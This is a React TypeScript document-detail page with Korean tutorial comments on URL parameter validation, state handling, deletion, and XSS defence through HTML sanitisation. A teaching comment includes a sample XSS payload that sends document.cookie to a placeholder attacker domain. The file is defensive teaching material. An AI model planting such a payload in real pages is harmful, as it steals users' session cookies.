/**
 * ============================================================================
 * DocumentDetailPage.tsx — 【고급】 문서 상세 보기 (+ XSS 방어)
 * ============================================================================
 *
 * [이 페이지에서 배울 것]
 *   1. URL 파라미터를 정규식으로 엄격하게 검증하기
 *   2. 로딩/오류/정상 상태를 early return으로 나누기
 *   3. ★★ dangerouslySetInnerHTML과 XSS 공격 방어 (가장 중요)
 *   4. mutateAsync + try/catch로 결과를 직접 기다리기
 *
 * ★★ XSS(Cross-Site Scripting)란?
 *   공격자가 남긴 글에 <script> 같은 코드를 심어 두면,
 *   그 글을 읽는 다른 사람의 브라우저에서 그 코드가 실행된다.
 *   그러면 로그인 쿠키를 훔치거나, 사용자 몰래 요청을 보낼 수 있다.
 *
 *   React는 기본적으로 안전하다. {변수}로 넣은 값은 전부 글자로만 표시된다.
 *   `<script>alert(1)</script>` 를 넣어도 그 문자열이 그대로 보일 뿐이다.
 *
 *   그런데 이 페이지는 에디터로 쓴 글을 HTML로 보여줘야 한다.
 *   즉 일부러 React의 보호막을 뚫어야 한다. 그래서 위험해진다.
 *   그 위험을 막는 방법이 아래 DOMPurify다.
 */

import { Link, useLocation, useNavigate, useParams } from "react-router-dom";
import { LearningGuideTitle } from "@/features/learning/components/LearningGuideTitle";
import { useDeleteDocumentMutation, useDocumentDetailQuery } from "../hooks/useDocumentQueries";
import { applicationNotification } from "@/shared/notification/applicationNotification";
import { convertRequestErrorToProblemDetails } from "@/shared/api/error/apiErrorHelpers";
import { apiErrorMessageMap } from "@/shared/api/error/apiErrorMessageMap";
import { useAuthSessionQuery } from "@/features/auth/hooks/useAuthSession";
import { sanitizeRichTextHtml } from "@/shared/lib/sanitizeRichTextHtml";

/**
 * ★ URL의 문서 번호를 숫자로 바꾼다. 이상하면 undefined를 돌려준다.
 *
 * [정규식 `/^[1-9]\d*$/` 뜯어보기]
 *   ^      문자열의 시작
 *   [1-9]  첫 글자는 1~9 중 하나  ← 0으로 시작하는 걸 막는다 ("007" 거부)
 *   \d*    그 뒤에 숫자가 0개 이상
 *   $      문자열의 끝
 *   → "1", "42", "1234"는 통과. "0", "007", "1.5", "-3", "abc", " 1"은 거부.
 *
 * ★ Number()만 쓰면 안 되나?
 *   안 된다. Number()는 놀랄 만큼 관대하다.
 *     Number("  12  ") → 12   (공백을 무시한다)
 *     Number("")       → 0    (빈 문자열이 0이 된다!)
 *     Number("0x1A")   → 26   (16진수로 해석한다)
 *   URL처럼 사용자가 조작할 수 있는 값에는 정규식으로 형식을 먼저 못 박고,
 *   그 다음에 숫자로 바꾸는 2단계 검증이 안전하다.
 */
const parseDocumentId = (rawDocumentId: string | undefined): number | undefined => {
  if (!rawDocumentId || !/^[1-9]\d*$/.test(rawDocumentId)) {
    return undefined;
  }
  const parsedDocumentId = Number(rawDocumentId);
  // 마지막으로 안전한 정수 범위인지도 확인한다.
  // 자릿수가 너무 큰 숫자는 정확도가 깨지기 때문이다.
  return Number.isSafeInteger(parsedDocumentId) ? parsedDocumentId : undefined;
};

export const DocumentDetailPage = () => {
  const routeParameters = useParams();
  const navigate = useNavigate();
  const location = useLocation();
  const authSessionQuery = useAuthSessionQuery();
  const isHistory = location.pathname.startsWith("/history");
  const basePath = isHistory ? "/history" : "/react/documents";
  const documentId = parseDocumentId(routeParameters.documentId);

  // "주소에 값은 있는데 형식이 잘못된" 경우를 구분한다.
  // 값이 아예 없는 경우와 이상한 값이 들어온 경우는 다르게 다뤄야 한다.
  const hasInvalidDocumentId = routeParameters.documentId !== undefined && documentId === undefined;

  const documentDetailQuery = useDocumentDetailQuery(documentId, isHistory);
  const deleteDocumentMutation = useDeleteDocumentMutation(isHistory);

  /**
   * 삭제 처리.
   *
   * ★ 여기서는 .mutate()가 아니라 .mutateAsync()를 썼다. 차이가 중요하다.
   *     mutate()      → 실행만 시키고 결과는 onSuccess/onError가 처리
   *     mutateAsync() → Promise를 돌려줘서 await로 기다릴 수 있다
   *
   *   왜 여기서는 기다려야 할까?
   *     삭제가 "성공한 뒤에" 목록 페이지로 이동해야 하기 때문이다.
   *     기다리지 않고 바로 navigate하면, 삭제가 실패했는데도
   *     목록으로 넘어가서 사용자는 지워진 줄 알게 된다.
   *
   *   ★ mutateAsync를 쓰면 오류를 반드시 try/catch로 잡아야 한다.
   *     안 잡으면 "처리되지 않은 Promise 거부" 오류가 콘솔에 뜬다.
   */
  const handleDeleteClick = async (): Promise<void> => {
    // window.confirm은 브라우저 기본 확인창이다.
    // ★ 간단하지만 실무에서는 잘 안 쓴다. 페이지 전체가 멈추고 디자인도 바꿀 수 없다.
    //   이 프로젝트에는 ConfirmDialog라는 더 나은 도구가 있으니
    //   (ProductModalCrudPage 참고) 그쪽 방식이 낫다.
    if (!documentId || !window.confirm("문서를 삭제하시겠습니까?")) {
      return;
    }
    try {
      await deleteDocumentMutation.mutateAsync(documentId);
      applicationNotification.success("문서를 삭제했습니다.");
      // navigate(주소)로 코드에서 페이지를 이동시킨다.
      // <Link>는 사용자가 클릭할 때, navigate는 코드가 판단해서 이동할 때 쓴다.
      navigate(basePath);
    } catch (requestError) {
      // 오류를 표준 형태로 바꿔서 알림으로 띄운다.
      // shared/api/error 계층 덕분에 한 줄로 끝난다.
      applicationNotification.apiError(convertRequestErrorToProblemDetails(requestError));
    }
  };

  // ══════════════════════════════════════════════════════════════════
  // ★ early return으로 상태별 화면을 나눈다.
  //   위에서부터 "안 되는 경우"를 하나씩 걸러 내고,
  //   전부 통과하면 맨 아래에서 정상 화면을 그린다.
  //   조건을 중첩하지 않아 읽기 쉽다.
  //
  //   ※ 이 return들은 반드시 모든 훅 아래에 있어야 한다.
  //     훅은 항상 같은 순서로 실행되어야 한다는 규칙 때문이다.
  // ══════════════════════════════════════════════════════════════════

  // 상태 1: 주소가 잘못됨
  if (hasInvalidDocumentId) {
    return (
      <div className="state-panel error-state" role="alert">
        <h1>잘못된 문서 주소입니다.</h1>
        <p>문서 번호는 1 이상의 숫자여야 합니다.</p>
        <Link to={basePath}>문서 목록으로 이동</Link>
      </div>
    );
  }
  // 상태 2: 불러오는 중
  if (documentDetailQuery.isPending) {
    return <div className="state-panel">문서를 불러오는 중입니다.</div>;
  }

  // 상태 3: 오류 또는 데이터 없음
  // ★ `|| !data` 를 함께 확인하는 이유:
  //   오류는 안 났는데 data가 undefined인 경계 상황이 있을 수 있다.
  //   이 조건 덕분에 아래 코드에서는 data가 확실히 있다고 TypeScript가 인정해 준다.
  if (documentDetailQuery.isError || !documentDetailQuery.data) {
    const problemDetails = convertRequestErrorToProblemDetails(documentDetailQuery.error);
    const userMessage = apiErrorMessageMap[problemDetails.errorCode] ?? problemDetails.detail;
    return (
      <div className="state-panel error-state" role="alert">
        <h1>문서를 불러오지 못했습니다.</h1>
        <p>{userMessage}</p>
        <button type="button" onClick={() => void documentDetailQuery.refetch()}>다시 시도</button>
      </div>
    );
  }

  // 상태 4: 정상. 여기까지 왔으면 data가 반드시 있다.
  //
  // ※ 변수 이름을 `document`로 지은 점은 주의가 필요하다.
  //   브라우저 전역 객체 `document`(DOM)를 가리게 된다.
  //   이 함수 안에서 document.getElementById 같은 걸 쓸 수 없다는 뜻이다.
  //   여기서는 DOM을 안 쓰므로 문제없지만, 되도록 다른 이름이 안전하다.
  const document = documentDetailQuery.data;
  return (
    <article className="document-detail">
      <div className="page-heading-row">
        <div>
          <LearningGuideTitle guideId={isHistory ? undefined : "document"}>{document.documentTitle}</LearningGuideTitle>
          <p>
            {document.authorName} · 버전 {document.versionNumber} · {document.documentStatus}
          </p>
        </div>
        {!isHistory || authSessionQuery.data?.superAdministrator ? <div className="button-row">
          <Link className="secondary-link" to={`${basePath}/${document.documentId}/edit`}>
            수정
          </Link>
          <button
            className="danger-button"
            onClick={() => void handleDeleteClick()}
            disabled={deleteDocumentMutation.isPending}
          >
            삭제
          </button>
        </div> : null}
      </div>
      {document.thumbnailImageUrl ? (
        <div className="document-detail-thumbnail">
          <img src={document.thumbnailImageUrl} alt={`${document.documentTitle} 대표 이미지`} />
        </div>
      ) : null}
      {/* ══════════════════════════════════════════════════════════
          ★★★ 이 프로젝트에서 가장 조심해야 할 코드다.
          ══════════════════════════════════════════════════════════

          [dangerouslySetInnerHTML이란?]
            "이 문자열을 글자가 아니라 진짜 HTML로 해석해서 넣어라"는 뜻이다.
            이름에 dangerously(위험하게)가 들어간 건 React가 일부러 그렇게 지은 것이다.
            쓸 때마다 "지금 위험한 짓을 하고 있다"고 상기시키려고.

          [왜 위험한가?]
            누가 글에 이런 걸 심었다고 하자:
              <img src=x onerror="fetch('http://공격자.com?c='+document.cookie)">
            그냥 넣으면 이 글을 읽는 모든 사람의 쿠키가 공격자에게 전송된다.
            이것이 XSS 공격이다.

          [DOMPurify.sanitize()가 하는 일]
            HTML을 분석해서 위험한 부분만 도려낸다.
              <script> 태그, onclick/onerror 같은 이벤트 속성,
              javascript: 로 시작하는 링크 등을 제거한다.
            <strong>, <p>, <img src="..."> 같은 정상 태그는 그대로 둔다.
            → 글 서식은 살리면서 공격만 막는다.

          [★ 반드시 기억할 것]
            1. DOMPurify를 절대 빼먹지 말 것. 한 군데만 빠져도 뚫린다.
            2. 프론트에서 막았다고 끝이 아니다. 서버에도 같은 검사가 있어야 한다.
               공격자는 브라우저를 거치지 않고 API를 직접 호출할 수 있다.
            3. 애초에 필요 없으면 쓰지 말 것.
               일반 텍스트라면 {변수}로 넣는 게 100% 안전하다.
          ══════════════════════════════════════════════════════════ */}
      <div
        className="rendered-document-content"
        // `__html` 이라는 어색한 키 이름도 의도적이다.
        // 실수로 쓸 수 없게, 반드시 찾아보고 쓰게 만들려는 것이다.
        dangerouslySetInnerHTML={{ __html: sanitizeRichTextHtml(document.contentHtml) }}
      />
      {document.attachmentFiles.length > 0 ? (
        <section className="document-attachment-section">
          <h2>첨부파일</h2>
          <ul className="attachment-file-list">
            {document.attachmentFiles.map((attachmentFile) => (
              <li key={attachmentFile.fileId}>
                <div>
                  <strong>{attachmentFile.originalFileName}</strong>
                  {/* 바이트를 KB로 바꿔 보여준다.
                      나누기 1024 → KB, 올림 → 0KB로 표시되는 걸 막는다,
                      toLocaleString → 천 단위 쉼표. */}
                  <small>{Math.ceil(attachmentFile.fileSize / 1024).toLocaleString()} KB</small>
                </div>
                {/* 파일 다운로드는 서버가 주는 실제 주소로 이동해야 하므로
                    <Link>가 아니라 <a>를 쓴다.
                    <Link>는 앱 내부 라우팅용이라 파일 다운로드에는 맞지 않는다. */}
                <a href={attachmentFile.downloadUrl}>다운로드</a>
              </li>
            ))}
          </ul>
        </section>
      ) : null}
      <p className="security-note">
        DOMPurify로 저장된 HTML을 정리한 뒤 화면에 출력합니다. 백엔드도 이미지 파일 시그니처와 안전한 MIME 타입을 검증합니다.
      </p>
    </article>
  );
};
